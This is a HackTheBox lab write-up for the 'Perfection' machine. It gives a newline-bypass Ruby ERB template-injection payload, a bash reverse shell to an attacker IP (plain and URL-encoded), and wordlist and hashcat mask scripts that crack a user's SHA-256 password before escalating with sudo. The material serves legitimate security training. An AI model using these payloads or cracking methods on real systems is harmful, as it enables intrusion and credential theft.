---
title: Perfection
tags:
  - HackTheBox
  - Easy
  - Linux
  - Ruby
  - SSTI
  - Python-Scripting
  - Brute-Forcing
  - Mask-Attack
  - Sudo-Vulnerability
date: 2025-02-09T00:00:00Z
---
![](Pasted%20image%2020250209132241.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.253 perfection.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- perfection.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http
|_http-title: Weighted Grade Calculator
```

So I checked its website:

![](Pasted%20image%2020250209132532.png)

I noticed a software called **WEBrick 1.7.0** running:

![](Pasted%20image%2020250209132633.png)

I also tried some LFI and found that the website is using **Sinatra**:

![](Pasted%20image%2020250209133507.png)

I'll try the calculator:

![](Pasted%20image%2020250209133849.png)

![](Pasted%20image%2020250209133935.png)

I'll capture the request with **Burpsuite**:

![](Pasted%20image%2020250209134217.png)

I now submit an OK request and capture it with **Burp**:

![](Pasted%20image%2020250209134544.png)

I'll try a possible SSTIs:

```shell
<%= %>
```

![](Pasted%20image%2020250209135304.png)

Got blocked by a regex.

## Weaponization

I'll try some SSTI payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md):

```sell
test
<%= IO.popen("id").readlines()%>

# to url encode:
test%0A%3C%25=%20IO.popen(%22id%22).readlines()%25%3E
```

## Exploitation

Got RCE:

![](Pasted%20image%2020250209140530.png)

So now I'll get a reverse shell with this payload:

```shell
test
<%= IO.popen("bash -c 'bash -i >& /dev/tcp/10.10.14.21/666 0>&1'").readlines()%>

# to url encode (encode all chars):
test%0A%3C%25%3D%20IO%2Epopen%28%22bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E21%2F666%200%3E%261%27%22%29%2Ereadlines%28%29%25%3E
```

> Got a reverse shell :D

![](Pasted%20image%2020250209141230.png)

### User flag

![](Pasted%20image%2020250209141413.png)

## Privilege Escalation

Susan has `sudo` privileges, but I don't know her password:

![](Pasted%20image%2020250209150626.png)

Inside Susan's home there is a database called `Migration/pupilpath_credentials.db`, which I downloaded to my machine. Then I opened it with an sqlite browser:

![](Pasted%20image%2020250209141749.png)

Let's try to crack those hashes:

![](Pasted%20image%2020250209141906.png)

None of them are successful. So I decided to check `/var/mail` and found that susan has an entry:

```shell
cat /var/mail/susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

Okey so now I'll create a python script that generates this wordlist:

```python
import itertools
import argparse
from tqdm import tqdm

def generate_case_variations(word):
    """Generates all word combinations"""
    return set(map("".join, itertools.product(*((c.lower(), c.upper()) for c in word))))

def generate_wordlist(firstname, min_number, max_number, case_sensitive, filename="passwords.txt"):
    variations = [firstname] if not case_sensitive else generate_case_variations(firstname)

    with open(filename, "w") as f:
        total_combinations = len(variations) * (max_number - min_number + 1)
        with tqdm(total=total_combinations, desc="Generating wordlist...", unit=" passwords") as pbar:
            for variation in variations:
                reversed_variation = variation[::-1]
                for i in range(min_number, max_number + 1):
                    password = f"{variation}_{reversed_variation}_{i}"
                    f.write(password + "\n")
                    pbar.update(1)

    print(f"\nWordlist created and saved in '{filename}' with {total_combinations} passwords.")

# Configurar argumentos de línea de comandos
parser = argparse.ArgumentParser(description="Password wordlists generator.")
parser.add_argument("firstname", type=str, help="Word to use.")
parser.add_argument("min_number", type=int, help="Minimum value.")
parser.add_argument("max_number", type=int, help="Maximum value.")
parser.add_argument("--case_sensitive", action="store_true", help="Generate all upper and lowercase combinations.")

args = parser.parse_args()

generate_wordlist(args.firstname, args.min_number, args.max_number, args.case_sensitive)
```

![](Pasted%20image%2020250209144531.png)

As I previously found susan's hash, I'll compare them so I can fit the correct hash. I'll modify the script to also generate the sha256 of each word in a wordlist:
- Susan's hash: `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
`

```python
import itertools
import argparse
import hashlib
from tqdm import tqdm

def generate_case_variations(word):
    """Generates all case variations of a word."""
    return set(map("".join, itertools.product(*((c.lower(), c.upper()) for c in word))))

def sha256_hash(word):
    """Converts a word to its SHA-256 hash."""
    return hashlib.sha256(word.encode()).hexdigest()

def generate_wordlist(firstname, min_number, max_number, case_sensitive, filename="passwords.txt"):
    variations = [firstname] if not case_sensitive else generate_case_variations(firstname)

    with open(filename, "w", encoding="utf-8") as f:
        total_combinations = len(variations) * (max_number - min_number + 1)
        with tqdm(total=total_combinations, desc="Generating wordlist...", unit=" passwords") as pbar:
            for variation in variations:
                reversed_variation = variation[::-1]
                for i in range(min_number, max_number + 1):
                    password = f"{variation}_{reversed_variation}_{i}"
                    hashed_password = sha256_hash(password)
                    f.write(f"{password}:{hashed_password}\n")  # Save in the format "password:hash"
                    pbar.update(1)

    print(f"\n✅ Wordlist created and saved in '{filename}' with {total_combinations} passwords.")

# Command-line argument configuration
parser = argparse.ArgumentParser(description="Password wordlist generator.")
parser.add_argument("firstname", type=str, help="Word to use.")
parser.add_argument("min_number", type=int, help="Minimum value.")
parser.add_argument("max_number", type=int, help="Maximum value.")
parser.add_argument("--case_sensitive", action="store_true", help="Generate all upper and lowercase combinations.")

args = parser.parse_args()

generate_wordlist(args.firstname, args.min_number, args.max_number, args.case_sensitive)
```

![](Pasted%20image%2020250209145415.png)

To find a match I'll use my script [KeyHunter](https://github.com/gitblanc/KeyHunter):

```shell
python3 keyhunter.py passwords.txt abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

![](Pasted%20image%2020250209151022.png)

> Got a match :D `susan:susan_nasus_413759210`

![](Pasted%20image%2020250209151050.png)

I can now login using ssh and execute `sudo -l`:

```shell
sudo -l

[redacted]
(ALL : ALL) ALL

sudo su
```

### Another way

This one is the *official writeup way*:

First, create a wordlist file:

```shell
echo "susan_nasus_" > wl
```

Then create a hash file containing susan's password hash:

```shell
echo "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f" > hash
```

Last, execute hashcat:

```shell
hashcat -m 1400 -a 6 hash wl ?d?d?d?d?d?d?d?d?d -O
```

### Root flag

![](Pasted%20image%2020250209151509.png)

==Machine pwned!==



